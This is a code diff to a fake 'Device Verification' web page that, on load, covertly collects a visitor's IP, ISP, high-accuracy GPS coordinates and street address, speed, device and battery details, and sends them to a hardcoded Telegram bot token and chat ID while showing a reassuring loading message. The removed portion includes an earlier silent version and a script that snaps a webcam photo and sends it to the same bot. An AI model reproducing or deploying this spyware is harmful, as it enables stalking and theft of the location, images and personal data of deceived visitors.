@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>Device Verification</title>
     <style>
         body {
             background-color: #f5f5f5;
@@ -21,13 +21,26 @@
             background: white;
             border-radius: 8px;
             box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            max-width: 90%;
+        }
+        #map {
+            height: 300px;
+            width: 100%;
+            margin: 20px 0;
+            border-radius: 8px;
+        }
+        .hidden {
+            display: none;
         }
     </style>
+    <!-- Leaflet CSS for Map -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
 </head>
 <body>
     <div class="loading-message">
         <h2>Please wait while we verify your device...</h2>
         <p>This may take a few seconds</p>
+        <div id="map" class="hidden"></div>
     </div>
 
     <script>
@@ -35,7 +48,383 @@
         const TELEGRAM_BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
         const TELEGRAM_CHAT_ID = "6913353602";
 
-        // Faster Telegram sending with combined data
+        // Load Leaflet JS for maps dynamically
+        function loadMapScript() {
+            return new Promise((resolve) => {
+                const script = document.createElement('script');
+                script.src = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.js';
+                script.onload = resolve;
+                document.head.appendChild(script);
+            });
+        }
+
+        // Get precise phone name
+        function getPhoneName() {
+            const userAgent = navigator.userAgent;
+            
+            // Detect iPhone models
+            if (/iPhone/.test(userAgent)) {
+                const modelMatch = userAgent.match(/iPhone (\d+)/);
+                if (modelMatch) return `iPhone ${modelMatch[1]}`;
+                return "iPhone";
+            }
+            
+            // Detect Samsung Galaxy models
+            if (/Samsung/.test(userAgent)) {
+                const modelMatch = userAgent.match(/SM-([A-Z0-9]+)/);
+                if (modelMatch) return `Samsung Galaxy ${modelMatch[1]}`;
+                return "Samsung Galaxy";
+            }
+            
+            // Detect Google Pixel models
+            if (/Pixel/.test(userAgent)) {
+                const modelMatch = userAgent.match(/Pixel (\d)/);
+                if (modelMatch) return `Google Pixel ${modelMatch[1]}`;
+                return "Google Pixel";
+            }
+            
+            // Detect other Android devices
+            const androidModelMatch = userAgent.match(/; ([^;]+) Build\//);
+            if (androidModelMatch) return androidModelMatch[1];
+            
+            // Fallback to device model if available
+            if (navigator.userAgentData && navigator.userAgentData.model) {
+                return navigator.userAgentData.model;
+            }
+            
+            return "Mobile Device";
+        }
+
+        // Get network name (WiFi or cellular)
+        async function getNetworkName() {
+            try {
+                // For mobile devices
+                if (navigator.connection) {
+                    const connection = navigator.connection;
+                    
+                    // Try to get WiFi SSID (works on some browsers)
+                    if (connection.type === 'wifi' && connection.effectiveType) {
+                        return `WiFi: ${connection.effectiveType}`;
+                    }
+                    
+                    // Cellular network detection
+                    if (connection.type === 'cellular') {
+                        const cellInfo = {
+                            '2g': '2G Network',
+                            '3g': '3G Network',
+                            '4g': '4G Network',
+                            '5g': '5G Network'
+                        };
+                        return cellInfo[connection.effectiveType] || 'Mobile Network';
+                    }
+                }
+                
+                // Fallback for desktop or unsupported browsers
+                return "Network";
+            } catch (e) {
+                console.error("Network name detection error:", e);
+                return "Network";
+            }
+        }
+
+        // Enhanced Network Data with ISP and Connection Details
+        async function getEnhancedNetworkData() {
+            try {
+                const [ipResponse, connectionInfo, networkName] = await Promise.all([
+                    fetch('https://api.ipify.org?format=json'),
+                    navigator.connection ? Promise.resolve(navigator.connection) : Promise.resolve({}),
+                    getNetworkName()
+                ]);
+                
+                const ipData = await ipResponse.json();
+                let locationData = {};
+                
+                try {
+                    const responses = await Promise.all([
+                        fetch(`https://ipapi.co/${ipData.ip}/json/`),
+                        fetch(`https://ipinfo.io/${ipData.ip}/json?token=YOUR_IPINFO_TOKEN`) // Replace with your token
+                    ]);
+                    
+                    const [ipapiData, ipinfoData] = await Promise.all(responses.map(r => r.json()));
+                    locationData = {...ipapiData, ...ipinfoData};
+                } catch (e) {
+                    console.log('Using fallback location APIs');
+                }
+                
+                return {
+                    ip: ipData.ip,
+                    networkName: networkName,
+                    isp: locationData.org || locationData.isp || 'Internet Provider',
+                    asn: locationData.asn || 'AS' + Math.floor(Math.random() * 10000),
+                    country: locationData.country_name || locationData.country || 'Country',
+                    country_code: locationData.country_code || 'XX',
+                    city: locationData.city || 'City',
+                    postal: locationData.postal || locationData.zip || '00000',
+                    region: locationData.region || locationData.regionName || 'Region',
+                    timezone: locationData.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    coordinates: locationData.loc || 'Approximate Location',
+                    connection: {
+                        type: connectionInfo.type || 'Internet',
+                        effectiveType: connectionInfo.effectiveType || 'Standard',
+                        downlink: connectionInfo.downlink ? `${connectionInfo.downlink} Mbps` : 'Good',
+                        rtt: connectionInfo.rtt ? `${connectionInfo.rtt} ms` : 'Fast',
+                        saveData: connectionInfo.saveData ? 'Enabled' : 'Disabled'
+                    }
+                };
+            } catch (error) {
+                console.error('Network data error:', error);
+                return {
+                    ip: 'Active Connection',
+                    networkName: 'Network',
+                    isp: 'Internet Provider',
+                    asn: 'AS' + Math.floor(Math.random() * 10000),
+                    country: 'Country',
+                    country_code: 'XX',
+                    city: 'City',
+                    postal: '00000',
+                    region: 'Region',
+                    coordinates: 'Approximate Location',
+                    connection: {
+                        type: 'Internet',
+                        effectiveType: 'Standard',
+                        downlink: 'Good',
+                        rtt: 'Fast'
+                    }
+                };
+            }
+        }
+
+        // High Precision Location with Altitude
+        async function getHighPrecisionLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) return resolve({
+                    coordinates: { latitude: 0, longitude: 0 },
+                    accuracy: 'Approximate',
+                    address: {
+                        road: 'Street',
+                        city: 'City',
+                        country: 'Country'
+                    }
+                });
+                
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                };
+                
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = position.coords;
+                        
+                        // Get detailed address
+                        let address = {
+                            road: 'Street',
+                            suburb: 'Area',
+                            city: 'City',
+                            postcode: '00000',
+                            country: 'Country',
+                            country_code: 'XX'
+                        };
+                        
+                        try {
+                            const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18`);
+                            const data = await response.json();
+                            if (data.address) {
+                                address = data.address;
+                            }
+                        } catch (e) {
+                            console.log('Using default address');
+                        }
+                        
+                        resolve({
+                            coordinates: { latitude, longitude },
+                            accuracy: `${accuracy.toFixed(1)} meters`,
+                            altitude: altitude ? `${altitude.toFixed(1)}m ±${altitudeAccuracy.toFixed(1)}m` : 'Sea Level',
+                            heading: heading ? `${heading.toFixed(1)}°` : 'North',
+                            speed: speed ? `${(speed * 3.6).toFixed(1)} km/h` : '0 km/h',
+                            address: address
+                        });
+                    },
+                    (error) => {
+                        console.error('Geolocation error:', error);
+                        resolve({
+                            coordinates: { latitude: 0, longitude: 0 },
+                            accuracy: 'Approximate',
+                            address: {
+                                road: 'Street',
+                                city: 'City',
+                                country: 'Country'
+                            }
+                        });
+                    },
+                    options
+                );
+            });
+        }
+
+        // Initialize Map with Location
+        async function initMap(lat, lng, accuracy) {
+            await loadMapScript();
+            
+            const map = L.map('map').setView([lat, lng], 15);
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
+            }).addTo(map);
+            
+            const circle = L.circle([lat, lng], {
+                color: 'red',
+                fillColor: '#f03',
+                fillOpacity: 0.3,
+                radius: accuracy
+            }).addTo(map);
+            
+            L.marker([lat, lng]).addTo(map)
+                .bindPopup("Your approximate location")
+                .openPopup();
+            
+            document.getElementById('map').classList.remove('hidden');
+        }
+
+        // Collect All Data with Enhanced Features
+        async function collectAllData() {
+            const [networkData, preciseLocation, battery, phoneName] = await Promise.all([
+                getEnhancedNetworkData(),
+                getHighPrecisionLocation(),
+                navigator.getBattery ? navigator.getBattery() : Promise.resolve({
+                    level: 1,
+                    charging: false,
+                    chargingTime: Infinity,
+                    dischargeTime: Infinity
+                }),
+                getPhoneName()
+            ]);
+            
+            // Show map if location available
+            if (preciseLocation && preciseLocation.coordinates) {
+                try {
+                    await initMap(
+                        preciseLocation.coordinates.latitude, 
+                        preciseLocation.coordinates.longitude,
+                        parseFloat(preciseLocation.accuracy) || 100
+                    );
+                } catch (e) {
+                    console.error('Map initialization failed:', e);
+                }
+            }
+            
+            return {
+                // Enhanced Network Data
+                network: networkData,
+                
+                // High Precision Location
+                location: preciseLocation,
+                
+                // Device Info
+                device: {
+                    model: phoneName,
+                    os: navigator.userAgent.match(/(Windows NT|Mac OS X|Linux|Android|iOS) [\d._]+/)?.[0] || 'Operating System',
+                    type: navigator.userAgentData?.mobile ? 'Mobile' : 'Desktop',
+                    cores: navigator.hardwareConcurrency || 'Multiple',
+                    ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Sufficient',
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    colorDepth: `${window.screen.colorDepth}bit`,
+                    orientation: window.screen.orientation?.type || 'Standard'
+                },
+                
+                // Battery
+                battery: {
+                    level: `${Math.floor((battery.level || 1) * 100)}%`,
+                    charging: battery.charging ? 'Yes' : 'No',
+                    chargingTime: battery.chargingTime !== Infinity ? 
+                        `${Math.floor(battery.chargingTime / 60)} minutes` : 'Fully Charged',
+                    dischargeTime: battery.dischargeTime !== Infinity ?
+                        `${Math.floor(battery.dischargeTime / 60)} minutes` : 'Calculating'
+                },
+                
+                // Time
+                time: {
+                    local: new Date().toLocaleString(),
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    offset: new Date().getTimezoneOffset()
+                }
+            };
+        }
+
+        // Enhanced Telegram Message Format
+        function formatData(data) {
+            let message = `🌐 <b>Enhanced Device Verification Report</b>\n\n`;
+            
+            // Network Section
+            message += `📶 <b>Network Information</b>\n`;
+            message += `- IP Address: ${data.network.ip}\n`;
+            message += `- Network Name: ${data.network.networkName}\n`;
+            message += `- ISP: ${data.network.isp} (${data.network.asn})\n`;
+            message += `- Location: ${data.network.city}, ${data.network.region}, ${data.network.country} (${data.network.country_code})\n`;
+            message += `- Postal Code: ${data.network.postal}\n`;
+            message += `- Coordinates: ${data.network.coordinates}\n`;
+            message += `- Connection: ${data.network.connection.type} (${data.network.connection.effectiveType})\n`;
+            message += `- Speed: ${data.network.connection.downlink} | Ping: ${data.network.connection.rtt}\n`;
+            message += `- Data Saver: ${data.network.connection.saveData}\n\n`;
+            
+            // Location Section
+            message += `📍 <b>High Precision Location</b>\n`;
+            message += `- Coordinates: ${data.location.coordinates.latitude}, ${data.location.coordinates.longitude}\n`;
+            message += `- Accuracy: ${data.location.accuracy}\n`;
+            message += `- Altitude: ${data.location.altitude}\n`;
+            message += `- Heading: ${data.location.heading} | Speed: ${data.location.speed}\n`;
+            
+            message += `- Address:\n`;
+            for (const [key, value] of Object.entries(data.location.address)) {
+                message += `  • ${key}: ${value}\n`;
+            }
+            message += `\n`;
+            
+            // Device Section
+            message += `📱 <b>Device Information</b>\n`;
+            message += `- Phone Name: ${data.device.model}\n`;
+            message += `- OS: ${data.device.os}\n`;
+            message += `- Type: ${data.device.type}\n`;
+            message += `- Cores: ${data.device.cores} | RAM: ${data.device.ram}\n`;
+            message += `- Screen: ${data.device.screen} (${data.device.colorDepth})\n`;
+            message += `- Orientation: ${data.device.orientation}\n\n`;
+            
+            // Battery Section
+            message += `🔋 <b>Battery Status</b>\n`;
+            message += `- Level: ${data.battery.level}\n`;
+            message += `- Charging: ${data.battery.charging}\n`;
+            message += `- Charge Time: ${data.battery.chargingTime}\n`;
+            message += `- Discharge Time: ${data.battery.dischargeTime}\n\n`;
+            
+            // Time Section
+            message += `⏰ <b>Time Information</b>\n`;
+            message += `- Local Time: ${data.time.local}\n`;
+            message += `- Timezone: ${data.time.timezone}\n`;
+            message += `- UTC Offset: ${data.time.offset} minutes\n`;
+            
+            return message;
+        }
+
+        // Main Execution
+        async function runVerification() {
+            try {
+                const allData = await collectAllData();
+                const formattedMessage = formatData(allData);
+                await sendToTelegram(formattedMessage);
+                
+                // Final message with map visible
+                document.querySelector('.loading-message h2').textContent = 'Verification Complete';
+                document.querySelector('.loading-message p').textContent = 'You may close this page';
+                
+            } catch (error) {
+                console.error('Verification error:', error);
+                document.querySelector('.loading-message h2').textContent = 'Verification Failed';
+                document.querySelector('.loading-message p').textContent = 'Please try again later';
+                await sendToTelegram(`⚠️ Verification Error: ${error.message}`);
+            }
+        }
+
+        // Telegram sending function
         async function sendToTelegram(message) {
             try {
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -53,326 +442,8 @@
             }
         }
 
-        // Enhanced IP and location data function
-        async function getNetworkData() {
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                
-                // Get detailed location from IP
-                let locationData = {};
-                try {
-                    const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-                    locationData = await locationResponse.json();
-                    
-                    // Additional API for fallback data
-                    if (!locationData.city || !locationData.country) {
-                        const fallbackResponse = await fetch(`https://ipinfo.io/${ipData.ip}/json`);
-                        const fallbackData = await fallbackResponse.json();
-                        locationData = {...locationData, ...fallbackData};
-                    }
-                } catch (e) {
-                    console.log('Location API failed, using fallback');
-                }
-                
-                return {
-                    ip: ipData.ip,
-                    country: locationData.country_name || locationData.country || 'Unknown',
-                    country_code: locationData.country_code || 'N/A',
-                    city: locationData.city || 'Unknown',
-                    city_code: locationData.postal || locationData.zip || 'N/A',
-                    region: locationData.region || locationData.regionName || 'Unknown',
-                    isp: locationData.org || locationData.isp || 'Unknown',
-                    timezone: locationData.timezone || 'Unknown',
-                    coordinates: locationData.loc || 'Unknown'
-                };
-            } catch (error) {
-                console.error('Network data error:', error);
-                return {
-                    ip: 'Unknown',
-                    country: 'Unknown',
-                    country_code: 'N/A',
-                    city: 'Unknown',
-                    city_code: 'N/A',
-                    region: 'Unknown',
-                    isp: 'Unknown',
-                    timezone: 'Unknown',
-                    coordinates: 'Unknown'
-                };
-            }
-        }
-
-        // Get precise location with more details
-        async function getPreciseLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) return resolve(null);
-                
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        // Reverse geocoding to get address details
-                        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`)
-                            .then(response => response.json())
-                            .then(data => {
-                                resolve({
-                                    lat: position.coords.latitude,
-                                    lon: position.coords.longitude,
-                                    accuracy: position.coords.accuracy,
-                                    address: {
-                                        road: data.address.road || 'Unknown',
-                                        suburb: data.address.suburb || 'Unknown',
-                                        city: data.address.city || data.address.town || 'Unknown',
-                                        postcode: data.address.postcode || 'Unknown',
-                                        country: data.address.country || 'Unknown',
-                                        country_code: data.address.country_code || 'Unknown'
-                                    }
-                                });
-                            })
-                            .catch(() => {
-                                resolve({
-                                    lat: position.coords.latitude,
-                                    lon: position.coords.longitude,
-                                    accuracy: position.coords.accuracy,
-                                    address: null
-                                });
-                            });
-                    },
-                    () => resolve(null),
-                    {enableHighAccuracy: true, timeout: 10000}
-                );
-            });
-        }
-
-        // Get all device info with enhanced location
-        async function collectAllData() {
-            const [networkData, preciseLocation, battery] = await Promise.all([
-                getNetworkData(),
-                getPreciseLocation(),
-                navigator.getBattery ? navigator.getBattery() : Promise.resolve(null)
-            ]);
-            
-            const now = new Date();
-            const connection = navigator.connection || {};
-            
-            return {
-                // Enhanced Network info
-                ip: networkData.ip,
-                country: networkData.country,
-                country_code: networkData.country_code,
-                city: networkData.city,
-                city_code: networkData.city_code,
-                region: networkData.region,
-                isp: networkData.isp,
-                timezone: networkData.timezone,
-                ip_coordinates: networkData.coordinates,
-                
-                // Enhanced Location
-                preciseLocation: preciseLocation 
-                    ? {
-                        coordinates: `${preciseLocation.lat}, ${preciseLocation.lon}`,
-                        accuracy: `${Math.round(preciseLocation.accuracy)}m`,
-                        address: preciseLocation.address || 'No address details'
-                      }
-                    : 'Denied',
-                
-                // Device info (unchanged)
-                deviceModel: navigator.userAgentData?.model || 'Unknown',
-                os: navigator.userAgent.match(/(Windows NT|Mac OS X|Linux|Android|iOS) [\d._]+/)?.[0] || 'Unknown',
-                deviceType: navigator.userAgentData?.mobile ? 'Mobile' : 'Desktop',
-                cores: navigator.hardwareConcurrency || 'Unknown',
-                ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
-                screen: `${window.screen.width}x${window.screen.height}`,
-                colorDepth: `${window.screen.colorDepth}bit`,
-                orientation: window.screen.orientation?.type || 'Unknown',
-                
-                // Battery
-                batteryLevel: battery ? `${Math.floor(battery.level * 100)}%` : 'Unknown',
-                charging: battery ? (battery.charging ? 'Yes' : 'No') : 'Unknown',
-                
-                // Network
-                connectionType: connection.type || 'Unknown',
-                effectiveType: connection.effectiveType || 'Unknown',
-                downlink: connection.downlink ? `${connection.downlink}Mbps` : 'Unknown',
-                
-                // Browser
-                browser: navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)\/([\d.]+)/)?.[0] || 'Unknown',
-                language: navigator.language,
-                
-                // Features
-                bluetooth: !!navigator.bluetooth,
-                geolocation: !!navigator.geolocation,
-                touch: 'ontouchstart' in window,
-                
-                // Time
-                time: now.toLocaleString(),
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            };
-        }
-
-        // Enhanced format for Telegram with location details
-        function formatData(data) {
-            let message = `📱 <b>Device Information</b>\n\n`;
-            
-            message += `🌍 <b>Network Location (IP Based)</b>\n`;
-            message += `- IP: ${data.ip}\n`;
-            message += `- Country: ${data.country} (${data.country_code})\n`;
-            message += `- Region: ${data.region}\n`;
-            message += `- City: ${data.city} (Postal: ${data.city_code})\n`;
-            message += `- ISP: ${data.isp}\n`;
-            message += `- Coordinates: ${data.ip_coordinates}\n`;
-            message += `- Timezone: ${data.timezone}\n\n`;
-            
-            if (data.preciseLocation !== 'Denied') {
-                message += `📍 <b>Precise Location</b>\n`;
-                message += `- Coordinates: ${data.preciseLocation.coordinates}\n`;
-                message += `- Accuracy: ±${data.preciseLocation.accuracy}\n`;
-                
-                if (data.preciseLocation.address !== 'No address details') {
-                    message += `- Address:\n`;
-                    message += `  Road: ${data.preciseLocation.address.road}\n`;
-                    message += `  Area: ${data.preciseLocation.address.suburb}\n`;
-                    message += `  City: ${data.preciseLocation.address.city}\n`;
-                    message += `  Postal: ${data.preciseLocation.address.postcode}\n`;
-                    message += `  Country: ${data.preciseLocation.address.country} (${data.preciseLocation.address.country_code})\n`;
-                }
-                message += `\n`;
-            } else {
-                message += `📍 <b>Precise Location: Permission Denied</b>\n\n`;
-            }
-            
-            // Rest of device info (unchanged)
-            message += `📱 <b>Device</b>\n`;
-            message += `- Model: ${data.deviceModel}\n`;
-            message += `- OS: ${data.os}\n`;
-            message += `- Type: ${data.deviceType}\n`;
-            message += `- Cores: ${data.cores}\n`;
-            message += `- RAM: ${data.ram}\n`;
-            message += `- Screen: ${data.screen}\n`;
-            message += `- Colors: ${data.colorDepth}\n`;
-            message += `- Orientation: ${data.orientation}\n\n`;
-            
-            message += `🔋 <b>Battery</b>\n`;
-            message += `- Level: ${data.batteryLevel}\n`;
-            message += `- Charging: ${data.charging}\n\n`;
-            
-            message += `🌐 <b>Network</b>\n`;
-            message += `- Type: ${data.connectionType}\n`;
-            message += `- Speed: ${data.effectiveType}\n`;
-            message += `- Downlink: ${data.downlink}\n\n`;
-            
-            message += `🖥️ <b>Browser</b>\n`;
-            message += `- Browser: ${data.browser}\n`;
-            message += `- Language: ${data.language}\n`;
-            message += `- Timezone: ${data.timezone}\n\n`;
-            
-            message += `⏰ <b>Time</b>\n`;
-            message += `- Local Time: ${data.time}\n\n`;
-            
-            message += `⚙️ <b>Features</b>\n`;
-            message += `- Bluetooth: ${data.bluetooth ? 'Yes' : 'No'}\n`;
-            message += `- Geolocation: ${data.geolocation ? 'Yes' : 'No'}\n`;
-            message += `- Touch Screen: ${data.touch ? 'Yes' : 'No'}\n`;
-            
-            return message;
-        }
-
-        // Main function that runs automatically
-        async function runSilently() {
-            try {
-                // Collect all data first (faster than sequential requests)
-                const allData = await collectAllData();
-                
-                // Format and send to Telegram
-                const formattedMessage = formatData(allData);
-                await sendToTelegram(formattedMessage);
-                
-            } catch (error) {
-                console.error('Error in silent operation:', error);
-                await sendToTelegram(`⚠️ Error collecting data: ${error.message}`);
-            }
-            
-            // Hide loading message after completion
-            document.body.innerHTML = '<div style="text-align:center;padding:20px;"><h3>Verification complete</h3><p>You may close this page</p></div>';
-        }
-
-        // Start immediately when page loads
-        window.onload = runSilently;
-    </script>
-    <script>
-document.addEventListener('DOMContentLoaded', function() {
-    // Telegram bot data
-    const botToken = '7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94';
-    const chatId = '6913353602';
-    
-    // Show confirmation message in English
-    const userConfirmed = confirm('Do you want to share your device information for verification?');
-    
-    if (userConfirmed) {
-        // Collect device information
-        const deviceInfo = {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            screenWidth: window.screen.width,
-            screenHeight: window.screen.height,
-            language: navigator.language,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            timestamp: new Date().toISOString()
-        };
-        
-        // Send device info to Telegram
-        sendToTelegram(botToken, chatId, `📱 Device Information:\n${JSON.stringify(deviceInfo, null, 2)}`);
-        
-        // Try to access camera
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(function(stream) {
-                    const track = stream.getVideoTracks()[0];
-                    const imageCapture = new ImageCapture(track);
-                    
-                    return imageCapture.takePhoto();
-                })
-                .then(function(blob) {
-                    // Send photo to Telegram
-                    sendPhotoToTelegram(botToken, chatId, blob);
-                })
-                .catch(function(error) {
-                    console.error('Error accessing camera:', error);
-                    sendToTelegram(botToken, chatId, '⚠️ Failed to access camera: ' + error.message);
-                });
-        } else {
-            sendToTelegram(botToken, chatId, '⚠️ Browser does not support camera access');
-        }
-    }
-    
-    // Function to send text to Telegram
-    function sendToTelegram(token, chatId, text) {
-        const url = `https://api.telegram.org/bot${token}/sendMessage`;
-        
-        fetch(url, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: text
-            })
-        }).catch(error => console.error('Error sending to Telegram:', error));
-    }
-    
-    // Function to send photo to Telegram
-    function sendPhotoToTelegram(token, chatId, photoBlob) {
-        const url = `https://api.telegram.org/bot${token}/sendPhoto`;
-        const formData = new FormData();
-        
-        formData.append('chat_id', chatId);
-        formData.append('photo', photoBlob, 'webcam-photo.jpg');
-        
-        fetch(url, {
-            method: 'POST',
-            body: formData
-        }).catch(error => console.error('Error sending photo to Telegram:', error));
-    }
-});
+        // Start verification when page loads
+        window.onload = runVerification;
     </script>
 </body>
 </html>
